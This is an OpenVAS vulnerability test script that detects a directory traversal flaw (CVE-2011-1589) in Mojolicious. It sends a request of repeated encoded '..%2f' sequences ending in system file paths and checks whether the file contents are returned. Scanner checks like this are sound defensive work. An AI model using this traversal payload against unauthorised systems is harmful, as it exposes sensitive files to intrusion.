###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_mojolicious_dir_trav_vuln.nasl 7577 2017-10-26 10:41:56Z cfischer $
#
# Mojolicious Directory Traversal Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation will allow attacker to obtain sensitive information
  that could aid in further attacks.
  Impact Level: Application";
tag_affected = "Mojolicious versions prior to 1.16.";
tag_insight = "The flaw is due to an error in 'Path.pm', which allows remote
  attackers to read arbitrary files via a %2f..%2f
  (encoded slash dot dot slash) in a URI.";
tag_solution = "Upgrade to Mojolicious version 1.16 or later.
  For updates refer to http://www.mojolicious.org/";
tag_summary = "The host is running Mojolicious and is prone to directory traversal
  vulnerability.";

if(description)
{
  script_id(801882);
  script_version("$Revision: 7577 $");
  script_tag(name:"last_modification", value:"$Date: 2017-10-26 12:41:56 +0200 (Thu, 26 Oct 2017) $");
  script_tag(name:"creation_date", value:"2011-05-18 15:37:30 +0200 (Wed, 18 May 2011)");
  script_bugtraq_id(47402);
  script_cve_id("CVE-2011-1589");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_name("Mojolicious Directory Traversal Vulnerability");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/44051");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/66830");
  script_xref(name : "URL" , value : "https://bugzilla.redhat.com/show_bug.cgi?id=697229");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_get_http_banner.nasl", "os_detection.nasl");
  script_mandatory_keys("Mojolicious/banner");
  script_require_ports("Services/www", 3000);
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

## Get HTTP Port
port = get_http_port(default:3000);
if(!port){
  exit(0);
}

## Get Http Banner
banner = get_http_banner(port:port);

## Confirm Mojolicious
if("Server: Mojolicious" >< banner)
{
  files = traversal_files();
  foreach file (keys(files))
  {
    ## Construct attack request
    url = string(crap(data:"..%2f",length:5*10),files[file]);

    ## Try exploit and check the response to confirm vulnerability
    if(http_vuln_check(port:port, url:url, pattern:file)) {
      security_message(port:port);
    }
  }
}
